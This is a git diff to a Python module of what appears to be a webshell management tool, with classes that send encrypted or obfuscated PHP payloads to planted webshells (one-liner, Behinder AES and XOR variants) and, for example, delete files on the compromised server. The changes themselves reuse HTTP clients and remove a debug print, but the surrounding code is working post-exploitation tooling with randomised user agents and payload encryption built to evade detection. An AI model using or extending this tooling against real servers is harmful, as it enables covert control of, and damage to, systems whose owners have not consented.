@@ -22,6 +22,9 @@ logger = logging.getLogger("sessions.php")
 
 user_agent = random_user_agent()
 
+# session id was specified to avoid session
+# forget to save session id in cookie
+
 SUBMIT_WRAPPER_PHP = """\
 if (session_status() == PHP_SESSION_NONE) {{
     session_id('{session_id}');
@@ -394,7 +397,6 @@ class PHPWebshell(PHPSessionInterface):
     async def delete_file(self, filepath: str) -> bool:
         php_code = DELETE_FILE_PHP.replace("FILE_PATH", repr(filepath))
         result = await self.submit(php_code)
-        print(result)
         if result == "WRONG_NOT_FILE":
             raise exceptions.FileError("目标不是一个文件")
         if result == "WRONG_NO_PERMISSION":
@@ -541,6 +543,7 @@ class PHPWebshellOneliner(PHPWebshell):
         self.params = {} if params is None else params
         self.data = {} if data is None else data
         self.http_params_obfs = http_params_obfs
+        self.client = httpx.AsyncClient(headers={"User-Agent": user_agent})
 
     async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
         params = self.params.copy()
@@ -558,11 +561,10 @@ class PHPWebshellOneliner(PHPWebshell):
             data[self.password] = payload
             data.update(obfs_data)
         try:
-            async with httpx.AsyncClient(headers={"User-Agent": user_agent}) as client:
-                response = await client.request(
-                    method=self.method, url=self.url, params=params, data=data
-                )
-                return response.status_code, response.text
+            response = await self.client.request(
+                method=self.method, url=self.url, params=params, data=data
+            )
+            return response.status_code, response.text
 
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求超时") from exc
@@ -580,13 +582,13 @@ class PHPWebshellBehinderAES(PHPWebshell):
         super().__init__(options)
         self.url = url
         self.key = md5_encode(password)[:16].encode()
+        self.client = httpx.AsyncClient(headers={"User-Agent": user_agent})
 
     async def submit_raw(self, payload):
         data = behinder_aes(payload, self.key)
         try:
-            async with httpx.AsyncClient(headers={"User-Agent": user_agent}) as client:
-                response = await client.request(method="POST", url=self.url, data=data)
-                return response.status_code, response.text
+            response = await self.client.request(method="POST", url=self.url, data=data)
+            return response.status_code, response.text
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求超时") from exc
         except httpx.HTTPError as exc:
@@ -603,13 +605,13 @@ class PHPWebshellBehinderXor(PHPWebshell):
         super().__init__(options)
         self.url = url
         self.key = md5_encode(password)[:16].encode()
+        self.client = httpx.AsyncClient(headers={"User-Agent": user_agent})
 
     async def submit_raw(self, payload):
         data = behinder_xor(payload, self.key)
         try:
-            async with httpx.AsyncClient(headers={"User-Agent": user_agent}) as client:
-                response = await client.request(method="POST", url=self.url, data=data)
-                return response.status_code, response.text
+            response = await self.client.request(method="POST", url=self.url, data=data)
+            return response.status_code, response.text
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求超时") from exc
         except httpx.HTTPError as exc:
